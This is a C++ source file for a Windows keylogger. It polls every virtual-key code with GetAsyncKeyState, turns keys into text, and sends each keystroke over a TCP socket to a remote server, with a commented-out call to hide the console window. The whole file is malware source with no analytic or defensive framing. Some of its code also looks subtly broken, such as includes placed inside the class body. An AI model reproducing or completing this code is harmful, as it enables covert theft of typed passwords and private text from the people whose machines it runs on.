
#ifdef _WIN32
#include<iostream>
#include<Windows.h>
#include<winuser.h>
#include<fstream>
#include <thread>
#endif

#include <boost/asio.hpp>


using boost::asio::ip::tcp;

//ShowWindow(GetConsoleWindow(), SW_HIDE);

class Logger
{
private:
    std::ofstream file;
    std::string filename;
public:
    Logger() noexcept {

        file.open("log.txt", std::ios::app);
    }
    ~Logger() {
        file.close();
    }
    void log_to_file(char ch) {
        try
        {
            file << ch;
            file.close();
        }
        catch (const std::exception& e)
        {
            std::cerr << "Error writing to file, "<<e.what() << std::endl;
        }

    }

#include <string>
#include <windows.h>  // Include Windows header for VK codes

    std::string handle_keys(char ch) {
        switch (ch) {
        case VK_BACK:
            return " VK_BACK ";
        case VK_TAB:
            return " VK_TAB ";
        case VK_SHIFT:
            return " VK_SHIFT ";
        case VK_CONTROL:
            return " VK_CONTROL ";
        case VK_MENU:
            return " VK_MENU ";
		case VK_RETURN:
			return "\n";
        case VK_CAPITAL:
            return " VK_CAPITAL ";
        case VK_ESCAPE:
            return " VK_ESCAPE ";
        case VK_OEM_3:  
            return "~";
        case VK_OEM_4:  
            return "[";
        case VK_OEM_6:  
            return "]";
        case VK_OEM_5:  
            return "\\";
        case VK_OEM_1:  
            return ";";
        case VK_OEM_7:  
            return "'";
        case VK_OEM_2:  
            return "/";
        case VK_OEM_COMMA: 
            return ",";
        case VK_OEM_PERIOD:  
            return ".";
        case VK_OEM_MINUS:  
            return "-";
        case VK_OEM_PLUS:  
            return "+";
        default:
            return std::string(1, ch);
        }
    }


    void log_to_server(tcp::socket& socket) {

		try
		{
            for (size_t i = 0; i < 255; i++)
            {
                short keyState = GetAsyncKeyState(char(i));
                if (keyState & 0x0001)
                {
					
					std::string key = handle_keys(char(i));

                    boost::asio::write(socket, boost::asio::buffer(key));
                }
            }
			
		}
		catch (const std::exception&)
		{
			std::cerr << "Error writing to server" << std::endl;
		}
    }

};


